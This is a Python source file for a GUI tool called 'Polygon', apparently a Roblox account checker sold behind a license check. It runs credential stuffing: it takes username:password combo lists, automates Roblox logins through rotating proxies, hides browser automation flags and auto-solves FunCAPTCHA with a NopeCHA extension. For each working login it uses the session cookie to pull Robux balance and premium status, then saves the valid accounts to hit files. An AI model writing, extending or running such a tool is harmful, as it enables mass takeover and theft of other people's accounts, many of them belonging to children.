import asyncio
import aiohttp
import json
import os
import tempfile
import shutil
from pathlib import Path
from flask import Flask, request, jsonify
from rich.console import Console
from playwright.async_api import async_playwright
from colorama import Fore, init
from threading import Lock
import sys
import eel
import requests

# Initialize Eel
eel.init('web')

console = Console()

CURRENT_VERSION = "1.0.0"
GITHUB_VERSION_URL = "https://raw.githubusercontent.com/xGCrafter/Roblox-Checker---Polygon/main/version.txt"

def check_version():
    try:
        response = requests.get(GITHUB_VERSION_URL, timeout=5)
        response.raise_for_status()
        latest_version = response.text.strip()
        if latest_version != CURRENT_VERSION:
            print(f"Version mismatch: Current {CURRENT_VERSION}, Latest {latest_version}. Continuing anyway.")
    except requests.exceptions.RequestException as e:
        print(f"Version check failed: {str(e)}. Continuing anyway.")

check_version()

app = Flask(__name__)
init(autoreset=True)
progress_lock = Lock()

CONFIG = {
    "timeout": 60,
    "retry_delay": 1.0,
    "api_delay": 0.5,
    "proxies": []
}

stats = {
    "hits": 0, "twofa": 0, "bad": 0, "totalrbx": 0,
    "locked": 0, "captcha": 0, "checked": 0, "total": 0
}

TEMP_DIR = Path(tempfile.gettempdir()) / "Polygon"
TEMP_DIR.mkdir(parents=True, exist_ok=True)
PROGRESS_FILE = TEMP_DIR / "progress.json"

# Store combos and proxies globally
COMBOS = []
PROXIES = []
SETTINGS = {
    "use_proxies": True,
    "use_captcha": False,
    "headless": True,
    "threads": 1,
    "captcha_api_key": ""
}

# Logs storage
LOGS = []

def log_message(message):
    LOGS.append(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}")
    eel.update_logs(LOGS[-1])()  # Push the latest log to the frontend

@eel.expose
def load_combo_file(file_content):
    global COMBOS
    try:
        lines = file_content.splitlines()
        COMBOS = [line.strip() for line in lines if ":" in line and line.strip()]
        log_message(f"Loaded {len(COMBOS)} combos from combo.txt")
        return {"success": True, "count": len(COMBOS)}
    except Exception as e:
        log_message(f"Error loading combo.txt: {str(e)}")
        return {"success": False, "error": str(e)}

@eel.expose
def load_proxy_file(file_content):
    global PROXIES
    try:
        lines = file_content.splitlines()
        PROXIES = [line.strip() for line in lines if line.strip()]
        log_message(f"Loaded {len(PROXIES)} proxies from proxy.txt")
        return {"success": True, "count": len(PROXIES)}
    except Exception as e:
        log_message(f"Error loading proxy.txt: {str(e)}")
        return {"success": False, "error": str(e)}

@eel.expose
def update_settings(settings):
    global SETTINGS
    SETTINGS.update(settings)
    log_message(f"Updated settings: {SETTINGS}")

@eel.expose
def get_stats():
    return stats

@eel.expose
def get_logs():
    return LOGS

def verify_license(license_key: str) -> dict:
    try:
        url = "https://api.licensegate.io/license/a1f7c/vmtest1222/verify"
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        data = response.json()
        if data.get('valid', False):
            log_message("License validation successful")
            return {"valid": True, "message": "License valid"}
        log_message(f"License validation failed: {data.get('message', 'Invalid license key')}")
        return {"valid": False, "message": data.get('message', 'Invalid license key')}
    except requests.exceptions.RequestException as e:
        log_message(f"License validation error: {str(e)}")
        return {"valid": False, "message": f"Validation error: {str(e)}"}

@eel.expose
def validate_license(license_key):
    return verify_license(license_key)

DEFAULT_NOPECHA_MANIFEST = {
    "manifest_version": 3,
    "name": "NopeCHA: CAPTCHA Solver",
    "version": "0.5.5",
    "description": "NopeCHA: CAPTCHA Solver",
    "icons": {
        "16": "icons/icon16.png",
        "48": "icons/icon48.png",
        "128": "icons/icon128.png"
    },
    "background": {
        "service_worker": "background.js"
    },
    "content_scripts": [
        {
            "matches": ["<all_urls>"],
            "js": ["content.js"],
            "run_at": "document_start",
            "all_frames": True
        }
    ],
    "action": {
        "default_icon": {
            "16": "icons/icon16.png",
            "48": "icons/icon48.png",
            "128": "icons/icon128.png"
        },
        "default_popup": "popup.html"
    },
    "permissions": [
        "storage",
        "unlimitedStorage",
        "webRequest",
        "scripting"
    ],
    "host_permissions": ["<all_urls>"],
    "web_accessible_resources": [
        {
            "resources": ["inject.js"],
            "matches": ["<all_urls>"]
        }
    ],
    "nopecha": {
        "key": ""
    }
}

def get_script_dir() -> Path:
    return Path(__file__).parent

def get_temp_dir() -> Path:
    return Path(tempfile.gettempdir()) / "Polygon"

def extract_nopecha_to_temp():
    temp_dir = get_temp_dir() / "nopecha"
    if temp_dir.exists():
        shutil.rmtree(temp_dir, ignore_errors=True)
    shutil.copytree(get_script_dir() / "nopecha", temp_dir)

def setup_nopecha_extension(api_key: str, console: Console) -> bool:
    nopecha_dir = get_temp_dir() / "nopecha"
    manifest_path = nopecha_dir / "manifest.json"
    if not nopecha_dir.exists():
        log_message("NopeCHA directory not found.")
        return False
    if not manifest_path.exists():
        log_message("manifest.json not found.")
        return False
    try:
        with manifest_path.open("r", encoding="utf-8") as f:
            manifest = json.load(f)
        if "nopecha" not in manifest:
            manifest["nopecha"] = {}
        manifest["nopecha"]["key"] = api_key
        manifest["funcaptcha_auto_solve"] = True
        manifest["funcaptcha_auto_open"] = True
        with manifest_path.open("w", encoding="utf-8") as f:
            json.dump(manifest, f, indent=4)
        log_message("NopeCHA extension set up successfully.")
        return True
    except Exception as e:
        log_message(f"NopeCHA setup failed: {str(e)}")
        return False

def get_random_proxy(proxies: list, proxy_index: int) -> str | None:
    if not proxies or proxy_index >= len(proxies):
        return None
    return proxies[proxy_index % len(proxies)]

def save_result(output_dir: str, category: str, account: str, account_details: dict = None):
    try:
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        file_map = {
            "Valid": "hits.txt",
            "Invalid": "bad.txt",
            "2FA": "2fa.txt",
            "Locked": "locked.txt",
            "Captcha": "captcha.txt",
            "Bad": "bad.txt"
        }
        file_name = file_map.get(category, "bad.txt")
        file_path = output_path / file_name
        with file_path.open("a", encoding="utf-8") as f:
            if category == "Valid" and account_details:
                details_str = (
                    f"Account: {account}\n"
                    f"Robux: {account_details.get('robux', 'N/A')}\n"
                    f"Premium Status: {account_details.get('is_premium', 'N/A')}\n"
                    f"Join Date: {account_details.get('join_date', 'N/A')}\n"
                    f"{'-'*50}\n"
                )
                f.write(details_str)
            else:
                f.write(f"[{account}]\n")
        log_message(f"Saved result: {category} - {account}")
    except Exception as e:
        log_message(f"Result save failed: {str(e)}")

async def fetch_account_details_api(session, user_id, roblox_security, console: Console, proxies: list) -> dict:
    details = {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
    headers = {
        "Cookie": f".ROBLOSECURITY={roblox_security}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
    }
    proxy_index = 0
    for attempt in range(2):
        proxy = get_random_proxy(proxies, proxy_index)
        proxy_dict = {"server": proxy} if proxy else None
        try:
            await asyncio.sleep(CONFIG["api_delay"])
            async with session.get(
                f"https://economy.roblox.com/v1/users/{user_id}/currency",
                headers=headers,
                proxy=proxy_dict["server"] if proxy_dict else None
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    details["robux"] = data.get("robux", 0)
                    stats["totalrbx"] += details["robux"]
                    break
                elif response.status == 429:
                    proxy_index += 1
                    await asyncio.sleep(CONFIG["retry_delay"])
                elif response.status in (401, 403):
                    return None
                else:
                    proxy_index += 1
                    break
        except Exception as e:
            proxy_index += 1
            break
    for attempt in range(2):
        proxy = get_random_proxy(proxies, proxy_index)
        proxy_dict = {"server": proxy} if proxy else None
        try:
            await asyncio.sleep(CONFIG["api_delay"])
            async with session.get(
                f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                headers=headers,
                proxy=proxy_dict["server"] if proxy_dict else None
            ) as response:
                if response.status == 200:
                    details["is_premium"] = "Yes" if (await response.json()).get("isPremium", False) else "No"
                    break
                elif response.status == 429:
                    proxy_index += 1
                    await asyncio.sleep(CONFIG["retry_delay"])
                elif response.status in (401, 403):
                    return None
                else:
                    proxy_index += 1
                    break
        except Exception as e:
            proxy_index += 1
            break
    for attempt in range(2):
        proxy = get_random_proxy(proxies, proxy_index)
        proxy_dict = {"server": proxy} if proxy else None
        try:
            await asyncio.sleep(CONFIG["api_delay"])
            async with session.get(
                f"https://users.roblox.com/v1/users/{user_id}",
                headers=headers,
                proxy=proxy_dict["server"] if proxy_dict else None
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    details["join_date"] = data.get("created", "N/A")
                    break
                elif response.status == 429:
                    proxy_index += 1
                    await asyncio.sleep(CONFIG["retry_delay"])
                elif response.status in (401, 403):
                    return None
                else:
                    proxy_index += 1
                    break
        except Exception as e:
            proxy_index += 1
            break
    return details

async def fetch_account_details_scrape(page, user_id, console: Console, actions: list) -> dict:
    details = {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
    try:
        actions.append({"type": "goto", "url": f"https://www.roblox.com/users/{user_id}/profile"})
        log_message(f"Navigating to profile: https://www.roblox.com/users/{user_id}/profile")
        await page.goto(f"https://www.roblox.com/users/{user_id}/profile", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
        actions.append({"type": "goto", "url": "https://www.roblox.com/home"})
        log_message("Navigating to home page: https://www.roblox.com/home")
        await page.goto("https://www.roblox.com/home", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
        try:
            robux_text = await page.locator("span#navbar-robux-balance").text_content(timeout=3000)
            robux = int(''.join(filter(str.isdigit, robux_text))) if robux_text else 0
            details["robux"] = robux
            stats["totalrbx"] += robux
            log_message(f"Scraped Robux: {robux}")
        except Exception as e:
            log_message(f"Robux scrape failed: {str(e)}")
        actions.append({"type": "goto", "url": f"https://www.roblox.com/users/{user_id}/profile"})
        log_message(f"Navigating back to profile: https://www.roblox.com/users/{user_id}/profile")
        await page.goto(f"https://www.roblox.com/users/{user_id}/profile", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
        try:
            premium_badge = await page.locator("span.icon-premium").count()
            details["is_premium"] = "Yes" if premium_badge > 0 else "No"
            log_message(f"Premium status: {details['is_premium']}")
        except Exception as e:
            log_message(f"Premium scrape failed: {str(e)}")
        try:
            join_date_text = None
            selectors = [
                "span.profile-join-date",
                "div.profile-header-content >> span",
                "p.profile-about-content-text",
                "div.profile-statistics >> span"
            ]
            for selector in selectors:
                try:
                    join_date_text = await page.locator(selector).text_content(timeout=3000)
                    if join_date_text and ("joined" in join_date_text.lower() or any(month in join_date_text.lower() for month in ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"])):
                        break
                except Exception:
                    continue
            details["join_date"] = join_date_text.strip() if join_date_text else "N/A"
            log_message(f"Join date: {details['join_date']}")
        except Exception as e:
            log_message(f"Join date scrape failed: {str(e)}")
    except Exception as e:
        log_message(f"Scrape error: {str(e)}")
    return details

async def fetch_account_details(page, cookies, console: Console, proxies: list, actions: list) -> dict:
    try:
        roblox_security = next((c["value"] for c in cookies if c["name"] == ".ROBLOSECURITY"), None)
        if not roblox_security:
            log_message("No .ROBLOSECURITY cookie found.")
            return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
        user_id = None
        try:
            user_id_script = await page.evaluate(r'() => document.body.innerHTML.match(/data-userid="(\d+)"/)?.[1]')
            user_id = user_id_script if user_id_script else None
            log_message(f"Extracted user ID: {user_id}")
        except Exception as e:
            log_message(f"User ID extract failed: {str(e)}")
        if not user_id:
            return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
        if roblox_security:
            async with aiohttp.ClientSession() as session:
                api_details = await fetch_account_details_api(session, user_id, roblox_security, console, proxies)
                if api_details is not None:
                    log_message("Fetched account details via API.")
                    return api_details
        return await fetch_account_details_scrape(page, user_id, console, actions)
    except Exception as e:
        log_message(f"Details fetch failed: {str(e)}")
        return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}

async def detect_captcha(page):
    try:
        # Basic CAPTCHA detection
        if "captcha" in page.url.lower():
            log_message("CAPTCHA detected: 'captcha' in URL")
            return True
        if await page.locator("div#captcha").count() > 0:
            log_message("CAPTCHA detected: 'div#captcha' element found")
            return True
        # Enhanced FunCAPTCHA detection (used by Roblox)
        if await page.locator(".fc-widget").count() > 0:
            log_message("FunCAPTCHA detected: '.fc-widget' element found")
            return True
        if await page.locator("#FunCaptcha").count() > 0:
            log_message("FunCAPTCHA detected: '#FunCaptcha' element found")
            return True
        if await page.locator("iframe[src*='funcaptcha']").count() > 0:
            log_message("FunCAPTCHA detected: iframe with 'funcaptcha' in src")
            return True
        # Check for CAPTCHA-related scripts
        captcha_script = await page.evaluate(
            """() => Array.from(document.getElementsByTagName('script'))
                .some(script => script.src.includes('funcaptcha') || script.src.includes('arkoselabs'))"""
        )
        if captcha_script:
            log_message("FunCAPTCHA detected: script with 'funcaptcha' or 'arkoselabs' in src")
            return True
        return False
    except Exception as e:
        log_message(f"CAPTCHA detection error: {str(e)}")
        return False

async def login_worker(queue, context, semaphore, output_dir, proxies, max_proxies_per_account, console, use_captcha_solver, proxy_index, pages, results, actions):
    async with semaphore:
        while True:
            try:
                combo = await queue.get()
                username, password = combo.split(":", 1)
                log_message(f"Checking account: {username}")
                page = await context.new_page()
                pages.append(page)
                try:
                    actions.append({"type": "goto", "url": "https://www.roblox.com/login"})
                    log_message("Navigating to login page: https://www.roblox.com/login")
                    await page.goto("https://www.roblox.com/login", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
                    actions.append({"type": "fill", "selector": "input#login-username", "value": username})
                    log_message(f"Filling username: {username}")
                    await page.fill("input#login-username", username)
                    actions.append({"type": "fill", "selector": "input#login-password", "value": password})
                    log_message(f"Filling password: {password}")
                    await page.fill("input#login-password", password)
                    actions.append({"type": "click", "selector": "button#login-button"})
                    log_message("Clicking login button")
                    await page.click("button#login-button")
                    await page.wait_for_load_state("networkidle", timeout=CONFIG["timeout"] * 1000)
                    # Enhanced CAPTCHA detection
                    if await detect_captcha(page):
                        stats["captcha"] += 1
                        save_result(output_dir, "Captcha", f"{username}:{password}")
                        results.append({"account": f"{username}:{password}", "status": "Captcha"})
                        log_message(f"CAPTCHA encountered for {username}")
                    elif "home" in page.url.lower():
                        stats["hits"] += 1
                        cookies = await context.cookies()
                        details = await fetch_account_details(page, cookies, console, proxies, actions)
                        save_result(output_dir, "Valid", f"{username}:{password}", details)
                        results.append({"account": f"{username}:{password}", "status": "Valid", "details": details})
                        log_message(f"Login successful for {username}")
                    elif "challenge" in page.url.lower() or await page.locator("div#challenge").count() > 0:
                        stats["twofa"] += 1
                        save_result(output_dir, "2FA", f"{username}:{password}")
                        results.append({"account": f"{username}:{password}", "status": "2FA"})
                        log_message(f"2FA required for {username}")
                    elif "locked" in page.url.lower() or await page.locator("div#locked").count() > 0:
                        stats["locked"] += 1
                        save_result(output_dir, "Locked", f"{username}:{password}")
                        results.append({"account": f"{username}:{password}", "status": "Locked"})
                        log_message(f"Account locked: {username}")
                    else:
                        stats["bad"] += 1
                        save_result(output_dir, "Bad", f"{username}:{password}")
                        results.append({"account": f"{username}:{password}", "status": "Bad"})
                        log_message(f"Login failed for {username}: Invalid credentials")
                except Exception as e:
                    stats["bad"] += 1
                    save_result(output_dir, "Bad", f"{username}:{password}")
                    results.append({"account": f"{username}:{password}", "status": "Bad"})
                    log_message(f"Login error for {username}: {str(e)}")
                finally:
                    stats["checked"] += 1
                    with open(PROGRESS_FILE, "w") as f:
                        json.dump(stats, f)
                    await page.close()
                    pages.remove(page)
                    log_message(f"Closed page for {username}")
                queue.task_done()
            except asyncio.QueueEmpty:
                break

@eel.expose
async def start_checking():
    global stats, COMBOS, PROXIES
    try:
        if not COMBOS:
            log_message("No combos loaded. Please upload a combo file.")
            return {"success": False, "error": "No combos loaded"}
        stats = {
            "hits": 0, "twofa": 0, "bad": 0, "totalrbx": 0,
            "locked": 0, "captcha": 0, "checked": 0, "total": len(COMBOS)
        }
        with open(PROGRESS_FILE, "w") as f:
            json.dump(stats, f)

        output_dir = os.path.join(get_temp_dir(), "output")
        if os.path.exists(output_dir):
            shutil.rmtree(output_dir, ignore_errors=True)

        results = []
        pages = []
        queue = asyncio.Queue()
        actions = []
        for combo in COMBOS:
            await queue.put(combo)

        async with async_playwright() as p:
            browser_args = [
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-infobars",
                "--disable-dev-shm-usage",
                "--disable-gpu",
            ]
            browser_kwargs = {
                "headless": SETTINGS["headless"],
                "args": browser_args,
            }
            if SETTINGS["use_captcha"] and SETTINGS["captcha_api_key"]:
                extract_nopecha_to_temp()
                if setup_nopecha_extension(SETTINGS["captcha_api_key"], console):
                    browser_kwargs["chromium_sandbox"] = False
                    browser_kwargs["args"].append(f"--load-extension={get_temp_dir() / 'nopecha'}")
                    browser_kwargs["args"].append("--disable-extensions-except=" + str(get_temp_dir() / "nopecha"))
                    log_message("CAPTCHA solver enabled with NopeCHA extension")

            log_message("Launching browser")
            browser = await p.chromium.launch(**browser_kwargs)
            proxy_index = 0
            proxy = get_random_proxy(PROXIES, proxy_index) if SETTINGS["use_proxies"] else None
            proxy_dict = {"server": proxy} if proxy else None
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 720},
                proxy=proxy_dict
            )

            semaphore = asyncio.Semaphore(SETTINGS["threads"])
            tasks = []
            for _ in range(SETTINGS["threads"]):
                task = asyncio.create_task(login_worker(queue, context, semaphore, output_dir, PROXIES, 1 if SETTINGS["use_proxies"] else 0, console, SETTINGS["use_captcha"], proxy_index, pages, results, actions))
                tasks.append(task)
                proxy_index += 1

            await queue.join()
            for task in tasks:
                task.cancel()

            for page in pages:
                await page.close()
            await context.close()
            await browser.close()
            log_message("Browser closed")

        eel.update_final_results({"stats": stats, "results": results, "output_dir": output_dir, "actions": actions})()
        eel.checking_complete()()
        log_message("Checking completed")
        return {"success": True}
    except Exception as e:
        log_message(f"Server error during checking: {str(e)}")
        eel.update_status({"error": f"Server error: {str(e)}"})()
        return {"success": False, "error": str(e)}

if __name__ == "__main__":
    # Start Eel instead of Flask
    eel.start('index.html', size=(1280, 720), port=5500)
